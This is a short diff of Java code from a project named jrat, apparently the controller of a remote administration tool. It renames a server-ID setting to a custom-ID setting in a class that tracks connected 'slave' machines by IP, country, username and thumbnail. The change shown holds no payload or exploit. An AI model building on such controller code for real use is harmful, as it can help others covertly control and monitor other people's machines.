@@ -20,7 +20,7 @@ import se.jrat.client.io.CountingOutputStream;
 import se.jrat.client.ip2c.Country;
 import se.jrat.client.net.PortListener;
 import se.jrat.client.settings.CountryStatistics;
-import se.jrat.client.settings.ServerID;
+import se.jrat.client.settings.CustomID;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.ui.panels.PanelMainLog;
@@ -62,7 +62,7 @@ public abstract class AbstractSlave implements Runnable {
 	protected long received = 0;
 	protected final long uniqueId = (long) (new Random()).nextInt(Integer.MAX_VALUE); // TODO change to int
 	protected int ping = 0;
-	protected String serverid;
+	protected String id;
 	protected String username;
 	protected ImageIcon thumbnail;
 	protected String version;
@@ -314,16 +314,16 @@ public abstract class AbstractSlave implements Runnable {
 		Frame.mainModel.setValueAt(formatUserString(), Utils.getRow(3, getIP()), 5);
 	}
 
-	public String getServerID() {
-		return serverid;
+	public String getID() {
+		return id;
 	}
 
 	public void setServerID(String serverid) {
-		this.serverid = serverid;
+		this.id = serverid;
 		
-		ServerID.ServerIDEntry entry = ServerID.getGlobal().findEntry(getRawIP());
+		CustomID.CustomIDEntry entry = CustomID.getGlobal().findEntry(getRawIP());
 		if (entry == null) {
-			Frame.mainModel.setValueAt(getServerID(), Utils.getRow(3, getIP()), 1);
+			Frame.mainModel.setValueAt(getID(), Utils.getRow(3, getIP()), 1);
 		} else {
 			setRenamedID(entry.getName());
 			Frame.mainModel.setValueAt(getRenamedID(), Utils.getRow(3, getIP()), 1);
